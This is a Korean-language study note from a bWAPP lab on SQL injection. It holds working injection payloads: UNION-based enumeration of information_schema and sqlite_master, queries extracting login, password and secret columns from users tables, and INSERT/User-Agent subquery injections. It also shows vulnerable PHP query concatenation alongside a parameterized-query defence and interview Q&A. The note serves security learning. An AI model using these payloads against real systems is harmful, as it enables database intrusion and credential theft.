# 2026-11-06 bWAPP SQL Injection 실습 정리

> 학습 환경: bWAPP 및 실습용 MySQL/SQLite. 아래 입력은 **허가된 실습 환경에서만** 사용한다. 기록에 있는 명령은 실행 성공 여부가 확인되지 않은 경우 **시도/메모**로 표시한다.

## 1. 오늘의 학습 흐름

1. `OR 1=1`과 `LIMIT`를 활용한 조건 및 결과 행 관찰
2. `UNION SELECT`의 컬럼 개수와 출력 위치 확인
3. MySQL `information_schema`를 통한 DB → 테이블 → 컬럼 구조 파악
4. bWAPP `blog` 테이블의 게시글 저장 결과 확인
5. `INSERT` 쿼리에 사용자 입력값을 문자열로 결합할 때의 위험 분석
6. SQLite의 `sqlite_master` 및 문자열 연결 연산자 비교
7. SQL Injection 방어 기법 정리

## 2. 기본 구문과 의미

### 조건식과 LIMIT

```sql
' or 1=1 limit 4,1#
' or 1=1 limit 5,1#
' or 1=1 -- 
```

- `OR 1=1`: 논리식이 참이 되도록 시도한다. 실제 우회 성공 여부는 기존 쿼리의 괄호와 조건 구조에 따라 다르다.
- MySQL의 `LIMIT offset, count`: `LIMIT 4,1`은 결과 중 다섯 번째 행부터 한 행을 요청한다.
- `#`: MySQL의 줄 끝 주석. `--`는 MySQL에서 뒤에 공백 등의 구분 문자가 필요하므로 `-- `로 적는 편이 안전하다.
- `ORDER BY`가 없으면 반환 행 순서는 보장되지 않는다.

### UNION 기반 조회 구조 확인

```sql
' union select 1,2,3,4 #
```

- 원래 `SELECT`의 결과 컬럼 수가 4개인지, 각 출력 위치가 어디인지 확인하는 시도다.
- `UNION` 양쪽 `SELECT`는 컬럼 수가 같아야 하고 자료형도 호환되어야 한다.
- 단순 오류 또는 정상 출력만으로 전체 취약점의 범위를 단정할 수 없다.

## 3. MySQL information_schema

| 대상 | 대표 컬럼 | 목적 |
|---|---|---|
| `information_schema.SCHEMATA` | `SCHEMA_NAME` | 데이터베이스 이름 |
| `information_schema.TABLES` | `TABLE_SCHEMA`, `TABLE_NAME` | DB별 테이블 목록 |
| `information_schema.COLUMNS` | `TABLE_SCHEMA`, `TABLE_NAME`, `COLUMN_NAME` | 테이블별 컬럼 목록 |

### 3.1 데이터베이스 이름 확인 시도

```sql
' union select 1,SCHEMA_NAME,3,4 from information_schema.SCHEMATA #
' union select 1,SCHEMA_NAME,3,4 from information_schema.SCHEMATA limit 1,1#
' union select 1,SCHEMA_NAME,3,4 from information_schema.SCHEMATA limit 2,1#
' union select 1,SCHEMA_NAME,3,4 from information_schema.SCHEMATA limit 3,1#
```

### 3.2 테이블 이름 확인 시도

```sql
' union select 1,TABLE_SCHEMA,3,TABLE_NAME from information_schema.TABLES #
' union select 1,TABLE_SCHEMA,3,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='bWAPP' #
' union select 1,TABLE_SCHEMA,3,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='bWAPP' limit 1,1#
' union select 1,TABLE_SCHEMA,3,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='bWAPP' limit 2,1#
' union select 1,TABLE_SCHEMA,3,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='bWAPP' limit 3,1#
' union select 1,TABLE_SCHEMA,3,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='bWAPP' limit 4,1#
```

### 3.3 컬럼 이름 확인 시도

```sql
' union select 1,TABLE_NAME,3,COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='bWAPP' and TABLE_NAME='users' #
' union select 1,TABLE_NAME,3,COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='bWAPP' and TABLE_NAME='users' limit 1,1 #
' union select 1,TABLE_NAME,3,COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='bWAPP' and TABLE_NAME='users' limit 2,1 #
' union select 1,TABLE_NAME,3,COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='bWAPP' and TABLE_NAME='users' limit 3,1 #
' union select 1,TABLE_NAME,3,COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='bWAPP' and TABLE_NAME='users' limit 4,1 #
```

### 3.4 실습용 사용자 테이블 데이터 조회 구문 메모

> 다음 구문은 강의 중 기록한 **시도용 예시**이며, 조회 성공이나 실제 데이터 노출이 확인된 것은 아니다. 실습 외의 사용자 데이터에는 적용하지 않는다.

```sql
' union select 1,login,3,password from users #
' union select 1,secret,3,email from users #
' union select 1,concat(login,password),3,concat(secret,email) from users #
```

- `CONCAT(a,b)`: MySQL에서 문자열을 결합한다.
- DB 구조를 파악하는 것과 민감한 계정 데이터에 접근하는 것은 보안상 구분해야 한다.

## 4. bWAPP blog 테이블: 직접 확인한 결과

MySQL 콘솔에서 다음 명령을 실행했다.

```sql
USE bWAPP;
SELECT * FROM blog;
```

확인된 행:

| id | owner | entry | date |
|---:|---|---|---|
| 1 | bee | abcd | 2026-11-06 03:43:56 |
| 2 | bee | LeBron is GOAT | 2026-11-06 03:44:34 |
| 3 | bee | KD just took the Hardest Road | 2026-11-06 03:47:01 |

- 게시글 데이터가 실제 `blog` 테이블에 저장된 것은 확인했다.
- `id`, `owner`, `entry`, `date` 컬럼이 조회되었다.
- `id`가 1, 2, 3으로 증가했지만, 이 결과만으로 `AUTO_INCREMENT` 설정 여부를 확정할 수는 없다. 확인하려면 `SHOW CREATE TABLE blog;`를 사용한다.
- 게시글이 저장되었다는 사실 자체는 SQL Injection 성공 증거가 아니다.

## 5. INSERT 기반 SQL Injection의 원리

강의 메모에 등장한 PHP 쿼리 조립 방식:

```php
$sql = "INSERT INTO blog (date, entry, owner) VALUES (now(),'" . $entry . "','" . $owner . "')";
```

`$entry`와 `$owner`를 SQL 문자열에 직접 이어 붙이면 입력값의 작은따옴표 등이 SQL 문법으로 해석될 수 있다.

### 5.1 전체 INSERT 문장을 웹 입력창에 넣었을 때

```sql
INSERT INTO blog (date, entry, owner)
VALUES (now(),'Jordan played against plumbers and milkmen','AbsolutelyNotKevin35');
```

- 위 구문은 **독립적인 MySQL 문장으로서는 정상적인 형태**다.
- 그러나 블로그 입력창에 넣으면 독립 SQL로 실행되는 것이 아니라, 서버가 만든 다른 SQL의 **입력 데이터 위치에 결합**될 수 있다.
- 내부 작은따옴표가 바깥 문자열을 끊으면서 구문 오류가 날 수 있다.

관찰된 오류 일부:

```text
You have an error in your SQL syntax ...
near 'Jordan played against plumbers and milkmen',
'AbsolutelyNotKevin35')" #','bee')' at line 1
```

**주의:** 실제 오류에 나타난 `#`는 마지막으로 공유한 입력 문자열에 포함되지 않았다. 입력 원문, 화면에서 보낸 값, 서버가 만든 최종 SQL이 동일했는지는 추가 확인이 필요하다.

### 5.2 서브쿼리 사용 시도

```sql
abcd',(select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1)) #
abcd',(select SCHEMA_NAME from information_schema.SCHEMATA limit 1,1)) #
abcd',(select SCHEMA_NAME from information_schema.SCHEMATA limit 2,1)) #
abcd',(select SCHEMA_NAME from information_schema.SCHEMATA limit 3,1)) #
```

- 기존 `VALUES`의 문자열을 종료하고 다른 값 위치에 스칼라 서브쿼리를 넣으려는 시도다.
- 스칼라 서브쿼리는 단일 컬럼, 최대 한 행을 반환해야 한다.
- 성공 여부는 실제 SQL 구조, 주석 처리, DB 권한 등에 좌우된다.
- **INSERT 시점의 직접적인 SQL Injection**과, 저장된 문자열이 나중에 다른 SQL에 재사용될 때 발생하는 **2차(Second-order) SQL Injection**은 구분한다.

## 6. SQLite 실습 메모

SQLite에서는 MySQL의 `information_schema` 대신 스키마 메타데이터를 `sqlite_master`(호환 이름) 또는 `sqlite_schema`에서 확인할 수 있다.

```sql
SELECT tbl_name, sql FROM sqlite_master;
```

강의 중 기록한 조회 시도:

```sql
0' union select 1,2,3,4,5,6,7 #
0' union select 1,tbl_name,3,4,5,6 from sqlite_master --
0' union select 1,tbl_name,3,4,5,6 from sqlite_master where tbl_name='users' --
0' union select 1,login,password,email,secret,6 from users --
0' union select 1,login||password,email,secret,5,6 from users --
```

**검토 사항:** 첫 줄은 7개 컬럼, 나머지는 6개 컬럼을 사용하므로 서로 다른 화면/원본 쿼리의 기록일 수 있다. 또한 SQLite에서는 MySQL식 `#` 주석이 아니라 `--`를 사용한다. 해당 명령들의 실행 결과는 미확인이다.

| 항목 | MySQL | SQLite |
|---|---|---|
| 스키마 정보 | `information_schema` | `sqlite_schema` / `sqlite_master` |
| 문자열 연결 | `CONCAT(a,b)` | `a || b` |
| 현재 시각 | `NOW()` | `datetime('now')` |
| 주석 | `#`, `-- ` | `--` |
| 일반적 형태 | 서버 기반 | 임베디드 DB |

## 7. visitors 테이블 및 User-Agent 입력

강의 메모:

```php
$sql = "INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(),'" . sqli($user_agent) . "','" . $ip_address . "')";
```

관련 입력 메모:

```sql
abcd', (select 문)) #
abcd',(select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1)) #
abcd',(select SCHEMA_NAME from information_schema.SCHEMATA limit 1,1)) #
```

- `User-Agent`도 HTTP 요청에 포함되는 **클라이언트 제어 가능 값**이므로 신뢰할 수 없다.
- `sqli()` 함수의 실제 구현을 확인하지 않고 안전하다고 판단해서는 안 된다.
- `ip_address` 값 역시 생성·전달 경로에 따라 검증이 필요하다.
- 최종 쿼리 구조 및 실행 성공 여부는 미확인이다.

## 8. 방어 방법

### 매개변수화된 쿼리 (PHP PDO 예시)

```php
$stmt = $pdo->prepare(
    "INSERT INTO blog (date, entry, owner) VALUES (NOW(), :entry, :owner)"
);
$stmt->execute([
    ':entry' => $entry,
    ':owner' => $owner
]);
```

1. SQL 명령과 사용자 입력값을 분리한다.
2. DB 계정에는 업무에 필요한 최소 권한만 부여한다.
3. 상세 SQL 오류는 사용자 화면에 그대로 노출하지 않고 서버 로그에서 관리한다.
4. 입력 검증과 출력 인코딩을 각각 목적에 맞게 적용한다. **출력 인코딩은 SQL Injection의 대체 방어책이 아니다.**
5. 저장된 값도 신뢰하지 않는다. 다른 SQL에서 재사용할 때 역시 매개변수화한다.

## 9. SQL Injection 실습 점검표

- [x] `bWAPP.blog`에서 3개 행 조회 확인
- [x] 블로그 입력에 전체 `INSERT` 구문을 넣었을 때 SQL 구문 오류 관찰
- [x] `information_schema`의 주요 테이블/컬럼 구조 기록
- [x] `UNION`, `LIMIT`, 서브쿼리 관련 입력값 기록
- [x] SQLite `sqlite_master` 관련 입력값 기록
- [ ] 각 페이로드별 실제 성공/실패 화면과 결과 매칭
- [ ] bWAPP 보안 레벨 확인
- [ ] `SHOW CREATE TABLE blog;`로 테이블 정의 확인
- [ ] MySQL/SQLite 실습 화면과 명령 기록 분리
- [ ] PHP 소스의 `sqli()` 구현 및 쿼리 결합 방식 확인

## 10. 면접 대비 핵심 Q&A

**Q1. SQL Injection은 왜 발생하나요?**  
A. 외부 입력값이 SQL 명령 문자열에 안전하게 분리되지 않고 결합되어, 데이터가 SQL 문법으로 해석될 수 있기 때문입니다.

**Q2. `UNION SELECT`는 무엇인가요?**  
A. 여러 `SELECT`의 결과를 합치는 구문입니다. 컬럼 수와 자료형 호환성이 중요합니다.

**Q3. `information_schema`는 무엇인가요?**  
A. MySQL에서 데이터베이스, 테이블, 컬럼 등의 메타데이터를 조회하는 시스템 스키마입니다.

**Q4. `LIMIT 2,1`의 의미는 무엇인가요?**  
A. 결과에서 처음 두 행을 건너뛰고 한 행을 요청합니다. 행 순서를 안정적으로 정하려면 `ORDER BY`가 필요합니다.

**Q5. SQL 구문 오류가 나오면 공격이 성공한 건가요?**  
A. 아닙니다. 입력값이 SQL 처리에 영향을 주었을 가능성을 보여주지만, 실제 의도하지 않은 조회나 변경이 이루어졌는지는 별도로 확인해야 합니다.

**Q6. INSERT 기반과 2차 SQL Injection의 차이는 무엇인가요?**  
A. INSERT 기반은 입력을 저장하는 SQL을 즉시 변조하는 경우이고, 2차 SQL Injection은 저장된 입력이 나중에 다른 SQL에 사용되며 문제를 일으키는 경우입니다.

**Q7. 가장 기본적인 방어책은 무엇인가요?**  
A. Prepared Statement를 이용한 매개변수화된 쿼리와 최소 권한 원칙입니다.

---

### 기억용 NBA 실습 데이터 🏀

- `LeBron is GOAT` — 정상 게시글 저장 확인
- `KD just took the Hardest Road` — 정상 게시글 저장 확인
- `Jordan played against plumbers and milkmen` / `AbsolutelyNotKevin35` — SQL 구문 오류 분석 사례

> **오늘의 핵심:** 게시글 저장 성공, SQL 구문 오류, 실제 SQL Injection 성공은 각각 별개의 관찰 결과다. 입력값이 SQL 명령으로 해석되지 않도록 **쿼리와 데이터를 분리**하는 것이 중요하다.
